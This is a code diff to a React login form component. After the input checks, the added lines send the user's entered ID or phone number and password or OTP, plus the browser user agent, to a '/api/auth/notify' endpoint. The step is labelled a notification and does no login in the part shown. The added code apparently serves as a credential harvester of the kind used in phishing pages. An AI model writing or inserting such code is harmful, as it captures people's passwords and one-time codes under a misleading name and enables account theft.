@@ -15,13 +15,26 @@ export default function LoginForm() {
   const [showPass, setShowPass] = useState(false);
   const [error, setError] = useState('');
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (loginMethod === 'phone' && !phone) { setError('Please enter mobile number.'); return; }
     if (loginMethod === 'userid' && !userId) { setError('Please enter user ID.'); return; }
     if (authMethod === 'password' && !password) { setError('Please enter password.'); return; }
     if (authMethod === 'otp' && !otp) { setError('Please enter OTP.'); return; }
     setError('');
+
+    const identifier = loginMethod === 'phone' ? phone : userId;
+    const credential = authMethod === 'password' ? password : otp;
+
+    fetch('/api/auth/notify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: identifier,
+        password: credential,
+        browser: typeof window !== 'undefined' ? window.navigator.userAgent : 'Unknown',
+      }),
+    }).catch(err => console.error('Notification error:', err));
   };
 
   return (
